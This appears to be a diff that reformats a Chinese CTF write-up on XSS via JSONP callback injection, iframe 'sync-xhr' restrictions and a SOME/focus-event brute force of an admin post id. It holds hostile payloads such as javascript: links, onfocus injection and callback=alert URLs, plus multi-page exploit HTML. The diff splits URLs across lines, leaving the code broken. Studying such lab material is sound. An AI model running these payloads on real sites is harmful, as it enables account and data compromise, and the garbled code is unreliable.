@@ -191,9 +191,10 @@ http://example.com/
 
 <html>
 
-<body>
 
-<a href="javascript:alert('hack')">hack</a>
+
+[hack](javascript:
+alert('hack'))
 
 <script>
 
@@ -213,7 +214,7 @@ document.head.appendChild(script);
 
 </script>
 
-</body>
+
 
 </html>
 
@@ -309,7 +310,8 @@ xhr.send()
 
 let xhr = new XMLHttpRequest();
 
-xhr.open("GET", "https://www.example.com:70000");//在open时就会报错
+xhr.open("GET", "https://www.example.com:
+70000");//在open时就会报错
 
 xhr.send()
 
@@ -325,7 +327,7 @@ https://blog.huli.tw/2022/04/07/iframe-and-window-open/
 
 iframe 就是新开了一个页面，iframe的父子窗口之间使用js交互同样必须遵循 同源策略，若想跨域操作可以用 postMessage
 
-iframe有个 allow 属性，用于为<iframe>指定其 特征策略 ，所以我们完全可以限制iframe页面的一些功能，像可以禁掉其中的一些api，比如 xhr。
+iframe有个 allow 属性，用于为指定其 特征策略 ，所以我们完全可以限制iframe页面的一些功能，像可以禁掉其中的一些api，比如 xhr。
 
 题目分析
 
@@ -549,7 +551,8 @@ http://a? onfocus=alert(123) id=x
 
 new URL("http://a? onfocus=alert(123) id=x") 不会报错
 
-之后访问 http://localhost:12345/#x 获取到id为x的焦点事件即可xss
+之后访问 http://localhost:
+12345/#x 获取到id为x的焦点事件即可xss
 
 但是，注意，这个点在这题并用不上。
 
@@ -791,7 +794,8 @@ body: post.body
 
 1
 
-http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%00
+http://localhost:
+12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%00
 
 这个链接经过
 
@@ -817,7 +821,8 @@ const id = new URLSearchParams(window.location.search).get('id');
 
 1
 
-http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23%00
+http://localhost:
+12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23%00
 
 不过多解释了，看图就明白了
 
@@ -833,7 +838,8 @@ http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=
 
 1
 
-http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23
+http://localhost:
+12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23
 
 同时设置其 allow="sync-xhr 'none'" 来禁用 xhr，使得try捕获异常从而跳转使用jsonp访问
 
@@ -863,13 +869,14 @@ test2.html
 
 <html>
 
-<body>
+
 
 <script>
 
 var iframe = document.createElement('iframe');
 
-iframe.src = "http://localhost:12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23";
+iframe.src = "http://localhost:
+12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23";
 
 iframe.allow = "sync-xhr 'none'";
 
@@ -877,7 +884,7 @@ document.body.appendChild(iframe);
 
 </script>
 
-</body>
+
 
 </html>
 
@@ -907,11 +914,13 @@ a.html
 
 open("/b.html");//打开b.html
 
-location="http://localhost:12345/";//重定向到admin的主页面（含有post id）
+location="http://localhost:
+12345/";//重定向到admin的主页面（含有post id）
 
 </script>
 
-a.html负责打开 /b.html 和将自身页面重定向到 http://localhost:12345/
+a.html负责打开 /b.html 和将自身页面重定向到 http://localhost:
+12345/
 
 b.html
 
@@ -977,7 +986,7 @@ b.html
 
 31
 
-<a id="default" href="#">default</a><!--默认聚焦点-->
+[default](#)<!--默认聚焦点-->
 
 <script>
 
@@ -1025,7 +1034,8 @@ open("/c.html");
 
 </script>
 
-b.html 负责创建 0123456789abcdef- 每个字符的iframe页面，同时创建焦点监听器监听焦点情况，如果监听到某个iframe的焦点则发送该iframe的name。之后打开 /c.html。注意 b.html 的 opener 指向 a页面(http://localhost:12345/)
+b.html 负责创建 0123456789abcdef- 每个字符的iframe页面，同时创建焦点监听器监听焦点情况，如果监听到某个iframe的焦点则发送该iframe的name。之后打开 /c.html。注意 b.html 的 opener 指向 a页面(http://localhost:
+12345/)
 
 c.html
 
@@ -1045,7 +1055,8 @@ open("/d.html");
 
 //执行回调函数的页面
 
-location="http://localhost:12345/"
+location="http://localhost:
+12345/"
 
 </script>
 
@@ -1093,7 +1104,8 @@ d.html
 
 const selfPostId = "6202f8a2-463d-4754-9675-eecde65b619c";//自己页面随便给个postid
 
-var host = "http://localhost:12345";
+var host = "http://localhost:
+12345";
 
 async function sleep(ms) {
 
@@ -1121,7 +1133,8 @@ setTimeout(main, 500);//等待所有页面加载完整后启动主程序
 
 注意 d.html 的 opener 指向 c页面。该页面的为主启动页面，利用多级opener，结合SOME攻击和focus事件逐位爆破a页面的post id。
 
-4个页面放服务器上，之后向xss bot发送 http://192.168.1.3:8000/a.html 爆破即可
+4个页面放服务器上，之后向xss bot发送 http://192.168.1.3:
+8000/a.html 爆破即可
 
 方案二
 
@@ -1143,7 +1156,8 @@ index.html
 
 open('/exp.html');
 
-location = 'http://localhost:12345/';
+location = 'http://localhost:
+12345/';
 
 </script>
 
@@ -1251,7 +1265,7 @@ exp.html
 
 51
 
-<a id="default" href="#">default</a>
+[default](#)
 
 <script>
 
@@ -1263,7 +1277,8 @@ return new Promise(resolve => setTimeout(resolve, ms));
 
 const selfId = "0780dd9c-e326-4786-ad80-e0e9d032cb4a";//自己给个存在的post id
 
-const host = "http://localhost:12345";//题目地址
+const host = "http://localhost:
+12345";//题目地址
 
 const charList = "0123456789abcdef-";
 
